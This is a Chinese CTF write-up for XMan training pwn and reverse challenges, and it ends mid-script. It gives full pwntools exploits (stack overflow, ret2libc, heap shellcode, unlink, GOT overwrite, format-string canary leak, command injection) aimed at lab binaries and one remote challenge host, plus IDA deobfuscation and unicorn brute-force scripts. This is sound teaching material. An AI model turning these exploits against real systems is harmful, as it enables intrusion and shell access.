简单写了一下pwn和re的wp，[更好体验点我](https://mask6asok.github.io/2019/08/06/XMan-Training-WP/)

# Pwn

## forgot

分析保护机制

![forgor1.png](https://i.loli.net/2019/08/06/1cVOkaCiJ9ZPouW.png)

没有canary，没有PIE，但是栈不可执行，再看看程序

![2.png](https://i.loli.net/2019/08/06/QONYRiqgrmvTSeB.png)

存在栈溢出情况，发现下面有一长串的操作，不管他，直接上字符串看看哪里是溢出点



![f2.png](https://i.loli.net/2019/08/06/QBAFUvg6z7jCkPp.png)

存在后门函数

```c 
int sub_80486CC()
{
  char s; // [esp+1Eh] [ebp-3Ah]
  snprintf(&s, 0x32u, "cat %s", "./flag");
  return system(&s);
}
```

所以构造payload为aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa+addr即可

![f4.png](https://i.loli.net/2019/08/06/XnJ1YiDFfEzL92m.png)

完整EXP:

```python
from pwn import *
context(arch='i386', os='linux')
context.log_level = "debug"
p = process("./forgot")
overflow = "A" * (0x2c + 4)
addr = 0x080486cc
overflow += p32(addr)
p.recv()
p.sendline('123')
p.recv()
p.sendline('aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa' + p32(addr))
p.recv()
```

## pwn-100

检查保护机制

![p1.png](https://i.loli.net/2019/08/06/Q2HasZKNBlzLd8Y.png)

查看功能，在这里存在栈溢出

```c 
int sub_40068E()
{
  char v1; // [rsp+0h] [rbp-40h]

  sub_40063D(&v1, 200LL, 10LL);
  return puts("bye~");
}
```

不存在后门函数，需要ret2libc，首先通过栈溢出泄漏libc

由于这里是64位程序，传参需要通过寄存器，通过程序中的gadget可以实现

相应payload为 popRdi_ret+func.got+puts.plt+retAddr

此处我们泄漏puts的函数，因此相应为

```py
p64(p_rdi) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(0x40068e)
```

这里返回地址我们重设为程序开头，可以再次输入

第一次溢出就可以泄漏puts.got中的内容，通过libc中puts的偏移计算出lib的基址，再取得system和/bin/sh的地址，从而在第二次输入时，构造

```python
p64(p_rdi) + p64(binsh) + p64(system)
```

即可getshell

![p2.png](https://i.loli.net/2019/08/06/sTaqLmQMZuG7I8n.png)

完整EXP：

```python
from pwn import *
p = process("./pwn100")
e = ELF("./pwn100")
libc = ELF("/libc64.so.6")
payload = 'a' * 0x40 + 'bbbbbbbb'
p_rdi = 0x400763
payload += p64(p_rdi) + p64(e.got['puts']) + p64(0x400500) + p64(0x40068e)
payload = payload.ljust(200, 'c')
p.sendline(payload)
p.recvuntil('\n')
libc_base = u64(p.recv(6) + '\x00\x00') - libc.symbols['puts']
payload = 'a' * 0x40 + 'bbbbbbb'
payload += p64(p_rdi) + p64(libc_base + 0x18CD57) + p64(libc_base + libc.symbols['system'])
payload = payload.ljust(200, 'c')
p.sendline(payload)
p.interactive()
```

## note_services2

这个程序比较复杂，涉及到heap的内容

![n1.png](https://i.loli.net/2019/08/06/plykQjSBWmeihtK.png)

可以看到这里有Canary与PIE，也就是莫得栈溢出利用，但是NX是关闭的，也就是可以执行shellcode，还有RWX的段，我们进去看看什么段有读写执行权限

![n2.png](https://i.loli.net/2019/08/06/aQnf3sANqZu9MHJ.png)

可以看到程序中的heap段与stack段都可执行，可以考虑shellcode

由于程序中的输入都在heap中，所以就要考虑跳到heap中执行我们输入的shellcode

看看add函数，发现存在一个bug，可以被利用

![n3.png](https://i.loli.net/2019/08/06/CRyZxpiEu6cTSBz.png)

若是把GOT表改去heap，则会跳到heap中执行

先看看point)list与GOT偏移多少

![n4.png](https://i.loli.net/2019/08/06/gvILnABh8KlxjCo.png)

所以给idx为-7，就可以改exit.got指向chunk

![n5.png](https://i.loli.net/2019/08/06/3igkP5MGBh2cZns.png)

接着就是shellcode的编写，由于程序限制一次只能输入8个字符，还会把最后一个字符或者回车符设为0，实际上也就是7个有效字符，所以不能直接发送一个完整的shellcode，可以考虑分成小部分，再通过jmp来在chunk中跳转，jmp offset的机器码为 E9 XX，试了几次，发现E9 16刚好可以跳到下一个chunk的开头（此处的指令是在每个chunk中的7字节中的后两位，也就是输入的是\xXX\xXX\xXX\xXX\xXX\xE9\x16

![n6.png](https://i.loli.net/2019/08/06/h8gvPAeGLRmiFdO.png)

接着就是shellcode的编写，虽然有所限制，但是还是可以从现有的shellcode中修改，此处我的使用shellcode是这样的，再实际输入时可以5个字节为一组再加上 E9 16 ，位数不够可以使用nop来凑

```assembly
   0:   31 c9                   xor    ecx,ecx
   2:   f7 e1                   mul    ecx
   4:   51                      push   rcx
   5:   68 2f 2f 73 68          push   0x68732f2f
   a:   5b                      pop    rbx
   b:   48 c1 e3 20             shl    rbx,0x20
   f:   68 2f 62 69 6e          push   0x6e69622f
  14:   59                      pop    rcx
  15:   48 09 cb                or     rbx,rcx
  18:   53                      push   rbx
  19:   48 89 e7                mov    rdi,rsp
  1c:   6a 00                   push   0x0
  1e:   5e                      pop    rsi
  1f:   48 31 c9                xor    rcx,rcx
  22:   b0 3b                   mov    al,0x3b
  24:   0f 05                   syscall
```

主要是/bin/sh的输入，若是以往，直接push或者赋值就可

```assembly
48 b8 2f 62 69 6e 2f    movabs rax,0x732f2f2f6e69622f
```

但是这样字节数过长，无法连贯我们的shellcode，所以我一半一半来，然后移位再或连接，就可以让rbx变成/bin/sh

![n7.png](https://i.loli.net/2019/08/06/1zZluNXHkpnMc3i.png)

调用exit就可以跳到heap执行shellcode再系统调用即可getshell

![n8.png](https://i.loli.net/2019/08/06/r5QR2WsBYj8cS4d.png)

![n9.png](https://i.loli.net/2019/08/06/fFZp9Msyl82aVzj.png)

完整EXP：

```python
from pwn import *
elf = "./note_service2"
p = process(elf)


def add(idx, s):
    p.recvuntil("your choice>> ")
    p.sendline("1")
    p.recvuntil("index:")
    p.sendline(str(idx))
    p.recvuntil("size:")
    p.sendline("8")
    p.recvuntil("content:")
    p.sendline(s)


def delete(idx):
    p.recvuntil("your choice>> ")
    p.sendline("4")
    p.recvuntil("index:")
    p.sendline(str(idx))


'''
   0:   31 c9                   xor    ecx,ecx
   2:   f7 e1                   mul    ecx
   4:   51                      push   rcx
   5:   68 2f 2f 73 68          push   0x68732f2f
   a:   5b                      pop    rbx
   b:   48 c1 e3 20             shl    rbx,0x20
   f:   68 2f 62 69 6e          push   0x6e69622f
  14:   59                      pop    rcx
  15:   48 09 cb                or     rbx,rcx
  18:   53                      push   rbx
  19:   48 89 e7                mov    rdi,rsp
  1c:   6a 00                   push   0x0
  1e:   5e                      pop    rsi
  1f:   48 31 c9                xor    rcx,rcx
  22:   b0 3b                   mov    al,0x3b
  24:   0f 05                   syscall
'''
add(-7, '\x31\xc9\xf7\xe1\x51\xe9\x16')
add(1, '\x68\x2f\x2f\x73\x68\xe9\x16')
add(1, '\x5b\x48\xc1\xe3\x20\xe9\x16')
add(1, '\x68\x2f\x62\x69\x6e\xe9\x16')
add(1, '\x59\x48\x09\xcb\x53\xe9\x16')
add(1, '\x48\x89\xe7\x90\x90\xe9\x16')
add(1, '\x6a\x00\x5e\x90\x90\xe9\x16')
add(1, '\x48\x31\xc9\xb0\x3b\x0f\x05')
p.recvuntil("your choice>> ")
p.sendline("5")
p.recv()
p.interactive()
```

## time_formatter

保护很全

![t1.png](https://i.loli.net/2019/08/06/VDYUdSutQZaHhRj.png)

有system函数在，但是不大能通过ROP来跳转

![t2.png](https://i.loli.net/2019/08/06/l6KHfV1Yh2dMGPx.png)

这里的command其实是可以做文章的

![t3.png](https://i.loli.net/2019/08/06/zuEUZIYgHv3Gd7p.png)

这样就可以起shell，那么如何输入

```
';'/bin/sh
```

在 Set a time format. 函数中有一个check会屏蔽如上的payload


```c
_BOOL8 __fastcall sub_400CB5(char *s)
{
  char accept; // [rsp+5h] [rbp-43h]
  unsigned __int64 v3; // [rsp+38h] [rbp-10h]

  strcpy(&accept, "%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# ");
  v3 = __readfsqword(0x28u);
  return strspn(s, &accept) == strlen(s);       // need true
} 
```
所以不能直接输入，但是在exit函数中，会把format的chunk给free掉，且可以继续运行不退出

```c 
signed __int64 exit()
{
  signed __int64 result; // rax
  char s; // [rsp+8h] [rbp-20h]
  unsigned __int64 v2; // [rsp+18h] [rbp-10h]

  v2 = __readfsqword(0x28u);
  delete(ptr);                                  // uaf
  delete(value);
  __printf_chk(1LL, "Are you sure you want to exit (y/N)? ");
  fflush(stdout);
  fgets(&s, 16, stdin);
  result = 0LL;
  if ( (s & 0xDF) == 'Y' )                      // N
  {
    puts("OK, exiting.");
    result = 1LL;
  }
  return result;
}
```

若这个时候再次malloc一个等同的chunk，就可以拿到原来存format的chunk，在 Set a time zone. 中可以申请chunk，且对输入没有check，可以修改，此时ptr还是指向这个chunk，从而在 Print your time. 中的内容，就是可控的，也就是在 Set a time zone. 中输入 ';'/bin/sh ，即可

![t4.png](https://i.loli.net/2019/08/06/O7AFWgIrPJv9jX1.png)

完整EXP：

```python
from pwn import *
p = process("./time_formatter")
p.recv()
p.sendline("1")
p.recv()
p.sendline("%aAbBcCdDe")
p.recv()
p.sendline("5")
p.recv()
p.sendline("N")
p.recv()
payload = "';'/bin/sh"
p.sendline("3")
p.recv()
p.sendline(payload)
p.recv()
p.sendline('4')
p.recv()
p.interactive()
```

## 4-ReeHY-main-1

保护机制

![41.png](https://i.loli.net/2019/08/06/x4MI8bnPyA6wX7c.png)

这道题有两种解法，利用heap和stack都可实现

### stack实现

![42.png](https://i.loli.net/2019/08/06/JYnLQmDjrOgyuEG.png)

creat时候存在整数溢出，导致可以直接往栈上写大量数据，同时这里的nbytes在malloc时候太大，所以返回一个NULL指针，没影响，直接栈上进行ROP泄漏GOT，再跳回到开头再次溢出到one_gadget getshell

![43.png](https://i.loli.net/2019/08/06/CvLiEZW8oybsfx7.png)

完整EXP：

```python
from pwn import *

libc_one_gadget_addr = 0x45216
p = process('./4-ReeHY-main')
elf = ELF('./4-ReeHY-main')
libc = ELF("/libc64.so.6")
p.sendlineafter('$ ', '1234')


def add(a, b, c):
    p.sendlineafter('$ ', '1')
    p.sendlineafter('Input size\n', str(a))
    p.sendlineafter('Input cun\n', str(b))
    p.sendlineafter('Input content', c)


pop_rdi = 0x400da3
main_addr = 0x400c8c

add(-1, 1, 'a' * 0x88 + '\x00' * 0x8 + 'a' * 0x8 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main_addr))

p.recv()
puts_addr = u64(p.recv()[:6].ljust(8, '\x00'))
log.success('puts_addr:' + hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
one_gadget_addr = libc_base + libc_one_gadget_addr
log.success('libc_base:' + hex(libc_base))
log.success('one_gadget_addr:' + hex(one_gadget_addr))
p.sendline('1234')
add(-1, 1, 'a' * 0x88 + '\x00' * 0x8 + 'a' * 0x8 + p64(one_gadget_addr))

p.interactive()

```

### heap实现

这里主要像是堆块的管理，所以可以看看堆管理方面有什么缺陷

我们可以看到show功能是没有的

```c 
int show()
{
  return puts("No~No~No~");
}
```

这在很多堆题中都是难题，莫得泄漏堆块内容，从而无法得知我们想要的数据

我们可以发现，他在一开始申请了一个chunk来记录我们以后申请的chunk的输入size

![44.png](https://i.loli.net/2019/08/06/X7OkWpjClbm1GVR.png)

而且在delete功能中，idx没有验证下限，导致可以往低地址走

![45.png](https://i.loli.net/2019/08/06/iKdpHqjwv2lh93z.png)

所以我们其实是可以把一开始申请的size_chunk给free掉，再次creat的时候就可以取得这个chunk，从而可以控制其他chunk的输入size

而且在edit的时候，是读size_chunk中的size，综合一下就可以实现堆块溢出

![46.png](https://i.loli.net/2019/08/06/QpvfJWAczYlgSi4.png)

接着我们就可以利用堆溢出在一个chunk中伪造一个chunk，其fd与bk可以是在程序中的chunk_list的相应偏移位置(-0x18,-0x10)，接着在覆盖到下一个chunk的prev_size和size位使得前一个fake chunk处于free态，接着delete下一个chunk，引发unlink（注意这个chunk的next chunk的size合法性）

![48.png](https://i.loli.net/2019/08/06/KE6AfNLawVZu7HD.png)

程序中的chunk_list中的指针指向chunk_list（unlink的效果）

![49.png](https://i.loli.net/2019/08/06/OpDBR5yXVjL1TZd.png)

接着修改这里的指针为free.got，puts.got，atoi.got

![40.png](https://i.loli.net/2019/08/06/ytZ4jvogbdkLFDX.png)

编辑free.got为puts.plt，这样调用delete实际上就是puts出来，这里delete 被修改冲puts的那个指针，就会把puts.got中的内容泄漏，继而取得libc，接着修改atoi.got为system，接着输入/bin/sh就是调用system("/bin/sh")

![47.png](https://i.loli.net/2019/08/06/zAaG8MRoOI5Flmc.png)

完整EXP：

```python
from pwn import *
p = process("./4-ReeHY-main")
e = ELF("./4-ReeHY-main")
p.recv()
p.sendline("1")
libc = ELF("/libc64.so.6")


def creat(sz, cun, ct):
    p.sendlineafter("$ ", '1')
    p.sendlineafter('\n', str(sz))
    p.sendlineafter('\n', str(cun))
    p.sendlineafter('\n', ct)


def delete(cun):
    p.sendlineafter("$ ", '2')
    p.sendlineafter('\n', str(cun))


def edit(cun, ct):
    p.sendlineafter("$ ", '3')
    p.sendlineafter('\n', str(cun))
    p.sendafter('\n', ct)


creat(0x98, 1, 'a')
creat(0x88, 2, 'b')
creat(0x88, 3, 'b')
delete(-2)
creat(20, 4, p32(0x200) * 4)
fake_chunk = ''
fake_chunk += p64(0) + p64(0x91)
fake_chunk += p64(0x6020f0 - 0x18) + p64(0x6020f0 - 0x10)
fake_chunk += p64(0) * 2 * 7 + p64(0x90) + p64(0x90)
edit(1, fake_chunk)
delete(2)
payload = p64(0) * 3
payload += p64(e.got['free']) + p64(1)
payload += p64(e.got['puts']) + p64(1)
payload += p64(e.got['atoi']) + p64(1)
edit(1, payload)
edit(1, p64(e.plt['puts']))
creat(0x8, 4, 'a' * 7)
# context.log_level = 'debug'
delete(2)
libc_base = u64(p.recv(6) + '\x00\x00') - libc.symbols['puts']
system = libc_base + libc.symbols['system']
print hex(libc_base)
edit(3, p64(system))
p.sendlineafter("$ ", '/bin/sh\x00')
p.interactive()
```



## babyfengshui

![b0.png](https://i.loli.net/2019/08/06/VCtvMscRBfJbwr7.png)

找找漏洞

![b1.png](https://i.loli.net/2019/08/06/CTUtaQYXAb5uIOi.png)

add功能中会往chunk中放指针，在这道题中，就是往user_chunk的头四个字节放description_chunk的指针，同时在display与update功能中会对这个指针的内容进行读写，这就是我们要利用的，如果可以把这个指针修改，就可以任意地址读写

问题就是如何进行溢出修改user_chunk中的指针，在add的实现中是descrip_chunk在user_chunk之上

![b3.png](https://i.loli.net/2019/08/06/z2xsqC3LuUpFgwo.png)

当对descrip_chunk进行写的时候，会验证长度确保不会写入user_chunk区域，这里直接利用两个chunk的地址来检查长度，硬核

但是也不是没有利用的方法，不可以修改自己的指针，可以修改别人的指针，若是在descrip_chunk与user_chunk之间存放有其他的user，则可以修改其余user的指针，从而利用其余user进行读写

先添加三个user，再把第一个delete掉，第一个user的两个chunk会进行合并（非fastbin）放进unsortedbin，接着再次申请一个user，这时候的descrip的长度控制使其chunk的size与unsortedbin中的chunk一致，这时候新建的user的descri_chunk会在头部，user_chunk会在底部，从而可以修改第二第三个user的数据，放一个free.got，将其改为system，再去free一个带有/bin/sh的chunk，即可getshell

![b2.png](https://i.loli.net/2019/08/06/V9Kg4YGiQBEj8Nc.png)

完整EXP：

```python
from pwn import *
elf = ELF('babyfengshui')
p = process("./babyfengshui")
libc = ELF("/libc32.so")


def add_user(size, length, text):
    p.sendlineafter("Action: ", '0')
    p.sendlineafter("description: ", str(size))
    p.sendlineafter("name: ", 'AAAA')
    p.sendlineafter("length: ", str(length))
    p.sendlineafter("text: ", text)


def delete_user(idx):
    p.sendlineafter("Action: ", '1')
    p.sendlineafter("index: ", str(idx))


def display_user(idx):
    p.sendlineafter("Action: ", '2')
    p.sendlineafter("index: ", str(idx))


def update_desc(idx, length, text):
    p.sendlineafter("Action: ", '3')
    p.sendlineafter("index: ", str(idx))
    p.sendlineafter("length: ", str(length))
    p.sendlineafter("text: ", text)


add_user(0x80, 0x80, 'AAAA')
add_user(0x80, 0x80, 'AAAA')
add_user(0x8, 0x8, '/bin/sh\x00')
delete_user(0)
add_user(0x100, 0x19c, "A" * 0x198 + p32(elf.got['free']))
display_user(1)
p.recvuntil("description: ")
free_addr = u32(p.recvn(4))
libc_base = free_addr - libc.symbols['free']
print hex(libc_base)
system_addr = libc_base + libc.symbols['system']
update_desc(1, 0x4, p32(system_addr))
delete_user(2)
p.interactive()
```

## Mary_Morton

![m0.png](https://i.loli.net/2019/08/06/xnY7aqUeOkmCWM3.png)

这一道有个canary保护，不能直接栈溢出，但是可以利用格式化字符串漏洞来泄漏canary

![m1.png](https://i.loli.net/2019/08/06/R1n82Ti6phaHQIt.png)

可以看到偏移是23

![m2.png](https://i.loli.net/2019/08/06/SohYfgJtwseTIUv.png)

```python
%23$p
```

读出canary后再覆盖到后门函数

```python
padding+canary+ebp+addr
```

就可getshell

![m3.png](https://i.loli.net/2019/08/06/3zSGjWcCILVygTn.png)

完整EXP：

```python
from pwn import *
context.log_level = 'debug'
p = process("./Mary_Morton")
system_addr = p64(0x4008de)
p.sendlineafter('3. Exit the battle \n', '2')
p.sendline('%23$p')
p.recvuntil('0x')
ss = p.recv(16)
pp = int(ss, 16)
pp = p64(pp)
p.sendline('1')
payload = 'a' * 17 * 8 + pp + 'a' * 8 + system_addr
p.sendline(payload)
p.recv()
p.interactive()
```

## warmup

爆破完事

![w0.png](https://i.loli.net/2019/08/06/3GVDHNrp7yXRBAt.png)

完整EXP：

```python
from pwn import *
for i in range(100):
    try:
        p = remote("111.198.29.45", "54400")
        p.recv()
        p.sendlineafter(">", p64(0x40060d) * i)
        flag = str(p.recv())
        if flag.find("{") != -1:
            print flag
            break
    except:
        pass
```

## 100levels

![10.png](https://i.loli.net/2019/08/06/x3SFkQ6fgvXtJPH.png)

没有Canary，貌似可以栈溢出？

![11.png](https://i.loli.net/2019/08/06/2FycQ5HWal8nGXw.png)

Hint功能中有输出system地址的字样

可惜这个全局变量check无法改变，一直都为0，也不存在格式化字符串去修改这个变量，也就是说我们是无法把这个值通过这个函数来泄漏system地址，但是看其汇编代码

![12.png](https://i.loli.net/2019/08/06/VisrUC7FveD1M4f.png)

虽然没得输出，但还是遗留在栈中，rbp-0x110的位置，也就是esp的位置，接着他就会返回，并不能输出，那么如何利用这个栈中的system地址？

![13.png](https://i.loli.net/2019/08/06/6uk4gm8zbwCLSyY.png)

我们发现，在Go功能中，postive变量位置是rbp-0x110，调试时可以发现函数栈rbp与Hint函数栈的rbp相同，也就是positive变量这时候就是system地址

![14.png](https://i.loli.net/2019/08/06/USl1VEkLHDuoq4y.png)

![15.png](https://i.loli.net/2019/08/06/aG36MpUDidfXsyE.png)

同时在这里可以注意到system函数地址可以保留（输入负数），再通过more可以修改偏移，存放在true里，也还是rbp-0x110，这样我们就可以在libc中跳了，可以跳去onegadget

![17.png](https://i.loli.net/2019/08/06/k5mgDa4NeIxp71A.png)

在game中存在栈溢出，而且，可以修改返回地址

![18.png](https://i.loli.net/2019/08/06/FrYO518XIdTNzpV.png)

我们想要返回到那个可控libc地址中，有一个神器的地址 

```python
0xffffffffff600000
```

![19.png](https://i.loli.net/2019/08/06/gAvQnYDhcsOjSVK.png)

这里会调用0x60的syscall，注意这里的参数设置

```c
name:sys_gettimeofday	rdi:struct timeval *tv	rsi:struct timezone *tz
```

调试一下发现rdi不可控，会指向输入的字符串，rsi会是strtol的返回值，这里如果是非0，可能会syscall报错，所以直接在字符串中写字母，即可让rsi为0

接着ret，若是栈上全部都是这个gadget，那么可以控制rip在栈上滑行，滑倒可控libc地址上执行

![1a.png](https://i.loli.net/2019/08/06/Z9bBkNcfQUyoLIC.png)

要注意这里的game是递归的，所以我们得到最后一局再去覆盖栈返回地址，之前的99据可以直接算出来

完整EXP：

```python
from pwn import *

p = process("./100levels")
libc = ELF("/libc64.so.6")

p.recv()
p.sendline('2')
p.recv()
p.sendline('1')
p.recv()
p.sendline('-1')
p.recv()
p.sendline(str(0x4526a - libc.symbols['system']))

for i in range(99):
    p.recvuntil('Question: ')
    a = int(p.recvuntil(" * ", drop=True))
    b = int(p.recvuntil(" =", drop=True))
    p.sendline(str(a * b))

p.recvuntil('Question: ')
a = int(p.recvuntil(" * ", drop=True))
b = int(p.recvuntil(" =", drop=True))
p.recvuntil(":")
payload = 'a' * 0x38 + p64(0xffffffffff600000) * 3
p.send(payload)
p.interactive()
```

## dice_game

![d0.png](https://i.loli.net/2019/08/06/M5A9XCf86z1ZU4H.png)

保护很足，但是没有canary，没得ROP

![D3.png](https://i.loli.net/2019/08/06/GZU8XdhEVoDvrbB.png)

存在后门函数，可是无法直接跳进来（可能是我太菜了，无法利用）



看其游戏规则，是要玩够50关猜数字游戏就可以直接得到flag，那就玩游戏吧

置随机数种子，然后取随机数猜，这个好办，种子在栈上，第一次输入可以覆盖种子，这里直接覆盖为0，linux glibc中的置随机数都是伪随机数，只要种子一样，生成的随机数序列是一样的，写一个c程序跑一下50个随机数

![d1.png](https://i.loli.net/2019/08/06/Dlci8jvgC75ERXN.png)

接着输入这50个数就可以读得flag

![d2.png](https://i.loli.net/2019/08/06/W8mi1dzZlqLorb5.png)

完整EXP：

```python
from pwn import *
p = process("./dice_game")

p.sendline('\x00' * 0x50)
p.recv()
ans = [
    2, 5, 4, 2, 6, 2, 5, 1, 4, 2, 3, 2, 3, 2, 6, 5, 1, 1, 5, 5, 6, 3, 4, 4, 3,
    3, 3, 2, 2, 2, 6, 1, 1, 1, 6, 4, 2, 5, 2, 5, 4, 4, 4, 6, 3, 2, 3, 3, 6, 1
]

for i in range(50):
    p.sendline(str(ans[i]))
    p.recvuntil("You win.")

print p.recv()
```

# Crypto

To-Do

# Reverse

## RE100

![00.png](https://i.loli.net/2019/08/08/gl1LutwPqzsbyEk.png)

IDA进去看，发现判断流程，这里有直接判断前10，后10个字符

![01.png](https://i.loli.net/2019/08/08/oNJh3MbungYLVTX.png)

跟进`confuseKey`函数，继续寻找，发现这里是字符串10个为一组进行分割成1,2,3,4

![02.png](https://i.loli.net/2019/08/08/Rbc41JoUlTsiACB.png)

接着以3,4,1,2,顺序拼接出来

![03.png](https://i.loli.net/2019/08/08/2N3cSgGIat1C4b9.png)

回去继续判断，所以得出真实的KEY

## APK逆向

其实这道题也不是APK吧

![10.png](https://i.loli.net/2019/08/08/i9Il2zANVZcUFok.png)

dnSpy打开，发现要在127.0.0.1监听flag

![11.png](https://i.loli.net/2019/08/08/kL5mvJ1FZj4ATDE.png)

运行得到flag

## shuffle

![30.png](https://i.loli.net/2019/08/08/ZKD57h4Wr1gYtme.png)

IDA打开，发现直接在栈中写入flag，取随机数异或来输出

![31.png](https://i.loli.net/2019/08/08/fJB75Rciko4ApWl.png)

直接丢GDB断点，在栈中读出flag

## key

也是一道简单题

在程序开头会去读取`C:\Users\CSAW2016\haha\flag_dir\flag.txt`，若文件不存在会报错，所以现在本地建立这个文件

接着有函数进行运算得出匹配字符串

![40.png](https://i.loli.net/2019/08/08/56rRGZNeHabnlyQ.png)

然后与用户输入进行check

![41.png](https://i.loli.net/2019/08/08/igozr96df3sRUTc.png)

这里先是用OD在这里下断，运行了好几次，匹配串都一样，考虑是否为这个，交一发成功了

## serial

![50.png](https://i.loli.net/2019/08/09/LrzhCcvusU54xk8.png)

![51.png](https://i.loli.net/2019/08/09/thN3fZEjD4TbL7B.png)

在这里存在一些奇怪的数据，还有一个奇怪的跳转指令，所以就考虑是花指令混淆

看到有很多自身异或再跳转的指令的指令（ 31 c0 xx xx xx）

![52.png](https://i.loli.net/2019/08/09/hWPTRLMNbVkS5H6.png)

尝试一下，NOP掉后三个，发现了正确的字符串

```python
begin=0x40099c
end=0x400CAC
for i in xrange(begin,end+1):
	if Byte(i)==0x31 and Byte(i+1)==0xc0:
		PatchByte(i+2,0x90)
		PatchByte(i+3,0x90)
		PatchByte(i+4,0x90)
```

由于有很多，可以写个PYTHON脚本来去花，在IDA中运行

![53.png](https://i.loli.net/2019/08/09/wKJ4tzF3IyXroQH.png)

去花成功，程序大体框架已经出来

![54.png](https://i.loli.net/2019/08/09/BdkCM1FmKWVeTgY.png)

但是却不能创建函数，无法F5，但是观察到结构很相似

![55.png](https://i.loli.net/2019/08/09/2nd7QzxoshS3iJY.png)

都是重复结构，发现就是这样的流程：从第一个字符开始匹配，然后以总16长度为对称取另一个字符相加再匹配

```python
a=[0x45,0x5a,0x39,0x64,0x6d,0x71,0x34,0x63]
b=[0x9b,0x9b,0x9b,0x9b,0xb4,0xaa,0x9b,0x9b]
c=""
for i in range(len(a)):
	print(chr(a[i]),end='')
	c+=chr(b[i]-a[i])
print(c[::-1])
```

简单写个python脚本来跑

![56.png](https://i.loli.net/2019/08/09/OZQdeDmXwBhKxyq.png)

后来重新打开发现可以F5了，直接能读

![0.png](https://i.loli.net/2019/08/09/FYXAjvpyque7zTL.png)

## reverse-box

这道题牛逼，学到了unicorn的用法

给出了信息不完整，还是在网上搜了原题WP来看

![60.png](https://i.loli.net/2019/08/09/ceXBIdgRw3fNipL.png)

程序调用list函数来生成一个256长度的tab，然后根据输入的flag的ascii在tab中取值输出

根据原题给的

>**Challenge description**
>$ ./reverse_box ${FLAG}
>95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a

当时的输入flag出来的是95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a

所以我们要根据这一串来得到flag

![61.png](https://i.loli.net/2019/08/09/A6GsmwYZF4nCdeO.png)

跟进list函数，发现里面是先取随机数再进行一系列操作得到tab，这里随机数是1-256,

得到的tab序列，我们可以根据flag的简单映射，来得到tab序列中的特殊位置值

本题是TWCTF，所以tab序列第84个是0x95，第87个是0xee

理论上我们可以模拟这个list函数里的流程来爆破出那个随机数，但是功底不好，这里有一些精度的问题，我用python或者c都实现不出来一模一样的生成方法，所以考虑使用unicorn来爆破

利用gef可以一键生成python unicorn模拟

```
unicorn-emulate -f addr -t addr
```

稍作修改，爆破EAX值，就是生成的随机数，再查到映射正确的序列，再输出

```python
import unicorn


def emulate(eax):
    emu = unicorn.Uc(unicorn.UC_ARCH_X86, unicorn.UC_MODE_32 + unicorn.UC_MODE_LITTLE_ENDIAN)
    emu.reg_write(unicorn.x86_const.UC_X86_REG_EAX, eax)
    emu.reg_write(unicorn.x86_const.UC_X86_REG_EBX, 0x0)
    emu.reg_write(unicorn.x86_const.UC_X86_REG_ECX, 0x14d4e658)
    emu.reg_write(unicorn.x86_const.UC_X86_REG_EDX, 0xf7fa63e4)
    emu.reg_write(unicorn.x86_const.UC_X86_REG_ESP, 0xffffd220)
    emu.reg_write(unicorn.x86_const.UC_X86_REG_EBP, 0xffffd248)
    emu.reg_write(unicorn.x86_const.UC_X86_REG_ESI, 0xf7fa6000)
    emu.reg_write(unicorn.x86_const.UC_X86_REG_EDI, 0xf7fa6000)
    emu.reg_write(unicorn.x86_const.UC_X86_REG_EIP, 0x80485b1)
    emu.reg_write(unicorn.x86_const.UC_X86_REG_EFLAGS, 0x202)
    emu.mem_map(0x0, 4096, 3)
    emu.mem_map(0x1000, 4096, 3)
    emu.mem_map(0x8048000, 4096, 5)
    # Importing /home/hugsy/ctf/tokyo_western_ctf_2016/reverse_box: 0x8048000-0x8049000
    data=open('/tmp/gef-0x8048000.raw', 'r').read()
    emu.mem_write(0x8048000, data)

    emu.mem_map(0x8049000, 4096, 1)
    # Importing /home/hugsy/ctf/tokyo_western_ctf_2016/reverse_box: 0x8049000-0x804a000
    data=open('/tmp/gef-0x8049000.raw', 'r').read()
    emu.mem_write(0x8049000, data)

    emu.mem_map(0x804a000, 4096, 3)
    # Importing /home/hugsy/ctf/tokyo_western_ctf_2016/reverse_box: 0x804a000-0x804b000
    data=open('/tmp/gef-0x804a000.raw', 'r').read()
    emu.mem_write(0x804a000, data)

    emu.mem_map(0xf7df7000, 1757184, 5)
    # Importing /lib/i386-linux-gnu/libc-2.23.so: 0xf7df7000-0xf7fa4000
    data=open('/tmp/gef-0xf7df7000.raw', 'r').read()
    emu.mem_write(0xf7df7000, data)

    emu.mem_map(0xf7fa4000, 8192, 1)
    # Importing /lib/i386-linux-gnu/libc-2.23.so: 0xf7fa4000-0xf7fa6000
    data=open('/tmp/gef-0xf7fa4000.raw', 'r').read()
    emu.mem_write(0xf7fa4000, data)

    emu.mem_map(0xf7fa6000, 4096, 3)
    # Importing /lib/i386-linux-gnu/libc-2.23.so: 0xf7fa6000-0xf7fa7000
    data=open('/tmp/gef-0xf7fa6000.raw', 'r').read()
    emu.mem_write(0xf7fa6000, data)

    emu.mem_map(0xf7fa7000, 12288, 3)
    # Importing : 0xf7fa7000-0xf7faa000
    data=open('/tmp/gef-0xf7fa7000.raw', 'r').read()
    emu.mem_write(0xf7fa7000, data)

    emu.mem_map(0xf7fd2000, 8192, 3)
    # Importing : 0xf7fd2000-0xf7fd4000
    data=open('/tmp/gef-0xf7fd2000.raw', 'r').read()
    emu.mem_write(0xf7fd2000, data)

    emu.mem_map(0xf7fd4000, 12288, 1)
    emu.mem_map(0xf7fd7000, 8192, 5)
    # Importing [vdso]: 0xf7fd7000-0xf7fd9000
    data=open('/tmp/gef-0xf7fd7000.raw', 'r').read()
    emu.mem_write(0xf7fd7000, data)

    emu.mem_map(0xf7fd9000, 139264, 5)
    # Importing /lib/i386-linux-gnu/ld-2.23.so: 0xf7fd9000-0xf7ffb000
    data=open('/tmp/gef-0xf7fd9000.raw', 'r').read()
    emu.mem_write(0xf7fd9000, data)

    emu.mem_map(0xf7ffb000, 4096, 3)
    # Importing : 0xf7ffb000-0xf7ffc000
